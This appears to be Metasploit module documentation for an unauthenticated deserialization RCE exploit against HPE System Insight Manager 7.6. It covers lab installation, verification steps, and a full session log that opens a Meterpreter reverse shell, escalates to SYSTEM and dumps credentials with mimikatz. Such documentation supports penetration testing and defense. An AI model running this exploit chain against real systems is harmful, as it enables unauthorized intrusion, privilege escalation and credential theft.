## Vulnerable Application
A remotely exploitable vulnerability exists within HPE System Insight Manager (SIM) version 7.6.x that can be
leveraged by a remote unauthenticated attacker to execute code within the context of HPE System Insight
Manager's `hpsimsvc.exe` process, which runs with administrative privileges. The vulnerability occurs due
to a failure to validate data during the deserialization process when a user submits a POST request to
the `/simsearch/messagebroker/amfsecure` page.

This module exploits this vulnerability by leveraging an outdated copy of Commons Collection, namely
3.2.2, that ships with HPE SIM, to gain RCE as the administrative user running HPE SIM.

### Installing HP SIM 7.6
1. Set up a Windows Server 2016 VM.
1. Sign up for a HP login if you do not have one already. You can use a throw away email address here.
1. Download HPE SIM from https://myenterpriselicense.hpe.com/cwp-ui/download/swd/product/details/HPSIM-Win-7.x.
1. Search for `Turn Windows Features On or Off`, select `Role-based or feature-based installation`, and click `Next`, until you see `Select features`.
1. Check `SNMP Service` and `.NET Framework 3.5 Features`, and click `Next`, then `Install`. You may need to be connected to the internet to install .NET 3.5.
1. Download SQL Server 2016 SP2 Express from https://www.microsoft.com/en-us/download/details.aspx?id=56840 and run the installer.
1. Open `Computer Management` and then go to `Computer Management (Local)->Services and Applications->SQL Server Configuration Manager->SQL Server Network Configuration->Protocols for SQLEXPRESS` and double click on `TCP/IP`.
1. Set `Enabled` to `Yes` under the `Protocol` tab.
1. Click on the `IP Addresses` tab and set all `TCP Dynamic Ports` fields from `0` to an empty field, and set all `TCP Port` fields to `1433`. Then click the `Apply` button.
1. Restart the SQL service by running `sc stop MSSQL$SQLEXPRESS` and then after a few seconds, run `sc start MSSQL$SQLEXPRESS`
1. Run the HPE SIM installer and when it gets to the `Database Configuration` page, it should default to `Use SQL/SQL Express`.
1. Ensure at this point that the username is `Administrator` (or whatever the name of the administrative user you are installing as is), and the `Domain` and `Host` values are correct, and that the port is `1433`.
1. For the `Password` field, enter the password of the `Administrator` (or whatever the name of the administrative user you are installing as is), and click the `Next` button.
1. Click `Typical` under the installation option and then select `Next`.
1. On the `Service Account Credentials` screen, enter the password for the `Administrative` user and click `Next`. Then click `Install`.
1. Wait for installation to complete, this could take up to 30 min.
1. Verify that you can view https://127.0.0.1:50000/simsearch/messagebroker/amfsecure and that the page returns a HTTP 200 OK response code.

## Verification Steps

1. Install the application ensure port 50000 is open on the target and that the `/simsearch/messagebroker/amfsecure` page is accessible.
1. Start msfconsole
1. Do: `use exploit/windows/http/sharepoint_data_deserialization`
1. Set the `RHOSTS` option.
1. Set the `TARGET` option if desired.
1. Set an appropriate payload for the `PAYLOAD` option.
1. Set any additional options as required by the previously selected payload
1. Run the exploit

## Options

## Scenarios

### SIM_7.6_Z7550-96287 on Server 2016

```
msf6 > use exploit/windows/http/hpe_sim_76_amf_deserialization
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/hpe_sim_76_amf_deserialization) > set RHOSTS 172.27.145.59
RHOSTS => 172.27.145.59
msf6 exploit(windows/http/hpe_sim_76_amf_deserialization) > set LHOST 172.27.150.115
LHOST => 172.27.150.115
msf6 exploit(windows/http/hpe_sim_76_amf_deserialization) > show options

Module options (exploit/windows/http/hpe_sim_76_amf_deserialization):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.27.145.59    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      50000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the HPE SIM server
   VHOST                       no        HTTP server virtual host


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.27.150.115   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows Powershell


msf6 exploit(windows/http/hpe_sim_76_amf_deserialization) > exploit

[*] Started reverse TCP handler on 172.27.150.115:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Target returned java.lang.NullPointerException in its 200 OK response!
[*] Sending stage (200262 bytes) to 172.27.145.59
[*] Meterpreter session 1 opened (172.27.150.115:4444 -> 172.27.145.59:53349) at 2021-03-08 16:04:52 -0600

meterpreter > getuid
Server username: WIN-QKA9JKS5MVU\Administrator
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeCreateTokenPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeLockMemoryPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain           NTLM                              SHA1
--------       ------           ----                              ----
Administrator  WIN-QKA9JKS5MVU  *censored*                        *censored*

wdigest credentials
===================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
Administrator     WIN-QKA9JKS5MVU  (null)
WIN-QKA9JKS5MVU$  WORKGROUP        (null)

kerberos credentials
====================

Username                 Domain           Password
--------                 ------           --------
(null)                   (null)           (null)
Administrator            WIN-QKA9JKS5MVU  (null)
MSSQL$SQLEXPRESS         NT Service       (null)
SQLTELEMETRY$SQLEXPRESS  NT Service       (null)
win-qka9jks5mvu$         WORKGROUP        (null)


meterpreter >
```
